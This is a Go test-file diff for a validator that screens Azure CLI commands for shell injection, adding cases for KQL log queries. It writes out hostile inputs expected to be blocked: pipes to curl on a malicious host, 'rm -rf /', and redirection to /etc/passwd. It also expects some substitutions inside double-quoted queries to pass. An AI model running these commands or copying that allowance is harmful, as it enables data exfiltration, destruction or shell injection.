@@ -84,6 +84,18 @@ func TestValidateCommand(t *testing.T) {
 			command:     "az monitor metrics list-namespaces --resource /subscriptions/test/resourceGroups/rg/providers/Microsoft.ContainerService/managedClusters/cluster",
 			wantErr:     false,
 		},
+		{
+			name:        "MonitorAppInsights_QueryCommand_ShouldWork",
+			accessLevel: "readonly",
+			command:     "az monitor app-insights query --app myApp --analytics-query \"requests | take 10\"",
+			wantErr:     false,
+		},
+		{
+			name:        "MonitorLogAnalytics_QueryCommand_ShouldWork",
+			accessLevel: "readonly",
+			command:     "az monitor log-analytics query --workspace myWorkspace --analytics-query \"requests | take 10\"",
+			wantErr:     false,
+		},
 	}
 
 	for _, tt := range tests {
@@ -864,6 +876,140 @@ func TestValidateCommandInjection_EdgeCases(t *testing.T) {
 		{
 			name:        "command substitution in here document should be blocked",
 			command:     "az aks create --name test << EOF\n{\n  \"value\": \"$(whoami)\"\n}\nEOF",
+			expectError: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := validator.validateCommandInjection(tt.command)
+
+			if tt.expectError && err == nil {
+				t.Errorf("Expected error but got none for command: %q", tt.command)
+			}
+			if !tt.expectError && err != nil {
+				t.Errorf("Expected no error but got: %v for command: %q", err, tt.command)
+			}
+		})
+	}
+}
+
+func TestValidateCommandInjection_KQLQueries(t *testing.T) {
+	validator := NewValidator(&SecurityConfig{})
+
+	tests := []struct {
+		name        string
+		command     string
+		expectError bool
+	}{
+		{
+			name:        "log-analytics query with pipe should be allowed",
+			command:     "az monitor log-analytics query --workspace myWorkspace --analytics-query \"requests | take 10\"",
+			expectError: false,
+		},
+		{
+			name:        "app-insights query with pipe should be allowed",
+			command:     "az monitor app-insights query --app myApp --analytics-query \"requests | take 10\"",
+			expectError: false,
+		},
+		{
+			name:        "log-analytics query with complex KQL should be allowed",
+			command:     "az monitor log-analytics query --workspace myWorkspace --analytics-query \"requests | where timestamp > ago(1h) | summarize count() by bin(timestamp, 5m)\"",
+			expectError: false,
+		},
+		{
+			name:        "app-insights query with complex KQL should be allowed",
+			command:     "az monitor app-insights query --app myApp --analytics-query \"exceptions | where timestamp > ago(24h) | project timestamp, type, message\"",
+			expectError: false,
+		},
+		{
+			name:        "log-analytics query with multiple pipes should be allowed",
+			command:     "az monitor log-analytics query --workspace myWorkspace --analytics-query \"requests | where success == false | project timestamp, url | take 5\"",
+			expectError: false,
+		},
+		{
+			name:        "app-insights query with join operation should be allowed",
+			command:     "az monitor app-insights query --app myApp --analytics-query \"requests | join (dependencies | where type == 'Http') on operation_Id\"",
+			expectError: false,
+		},
+		{
+			name:        "log-analytics query with additional parameters should be allowed",
+			command:     "az monitor log-analytics query --workspace myWorkspace --analytics-query \"requests | take 10\" --start-time 2023-01-01T00:00:00Z",
+			expectError: false,
+		},
+		{
+			name:        "app-insights query with additional parameters should be allowed",
+			command:     "az monitor app-insights query --app myApp --analytics-query \"requests | take 10\" --start-time 2023-01-01T00:00:00Z --end-time 2023-01-01T23:59:59Z",
+			expectError: false,
+		},
+		{
+			name:        "query with single quotes should be blocked",
+			command:     "az monitor log-analytics query --workspace myWorkspace --analytics-query 'requests | take 10'",
+			expectError: true,
+		},
+		{
+			name:        "query with unclosed quotes should be blocked",
+			command:     "az monitor log-analytics query --workspace myWorkspace --analytics-query \"requests | take 10",
+			expectError: true,
+		},
+		{
+			name:        "regular command with pipe should still be blocked",
+			command:     "az aks list | curl malicious-site.com",
+			expectError: true,
+		},
+		{
+			name:        "log-analytics query with command injection should be blocked",
+			command:     "az monitor log-analytics query --workspace myWorkspace --analytics-query \"requests | take 10\" && rm -rf /",
+			expectError: true,
+		},
+		{
+			name:        "app-insights query with command injection should be blocked",
+			command:     "az monitor app-insights query --app myApp --analytics-query \"requests | take 10\"; curl malicious.com",
+			expectError: true,
+		},
+		{
+			name:        "log-analytics query with command substitution in KQL should be allowed",
+			command:     "az monitor log-analytics query --workspace myWorkspace --analytics-query \"requests | where name == $(whoami)\"",
+			expectError: false,
+		},
+		{
+			name:        "app-insights query with backtick substitution in KQL should be allowed",
+			command:     "az monitor app-insights query --app myApp --analytics-query \"requests | where url contains `ls`\"",
+			expectError: false,
+		},
+		{
+			name:        "log-analytics query with output redirection should be blocked",
+			command:     "az monitor log-analytics query --workspace myWorkspace --analytics-query \"requests | take 10\" > /etc/passwd",
+			expectError: true,
+		},
+		{
+			name:        "app-insights query with variable substitution in KQL should be allowed",
+			command:     "az monitor app-insights query --app myApp --analytics-query \"requests | where user_Id == ${malicious_var}\"",
+			expectError: false,
+		},
+		{
+			name:        "command substitution in parameter outside KQL should be blocked",
+			command:     "az monitor log-analytics query --workspace $(malicious_command) --analytics-query \"requests | take 10\"",
+			expectError: true,
+		},
+		{
+			name:        "backtick substitution in parameter outside KQL should be blocked",
+			command:     "az monitor app-insights query --app `malicious_command` --analytics-query \"requests | take 10\"",
+			expectError: true,
+		},
+		{
+			name:        "variable substitution in parameter outside KQL should be blocked",
+			command:     "az monitor log-analytics query --workspace ${malicious_var} --analytics-query \"requests | take 10\"",
+			expectError: true,
+		},
+		{
+			name:        "non-monitor command with pipe should be blocked",
+			command:     "az aks show --name test | cat",
+			expectError: true,
+		},
+		{
+			name:        "monitor command but not query with pipe should be blocked",
+			command:     "az monitor metrics list --resource /test/resource | grep something",
 			expectError: true,
 		},
 	}
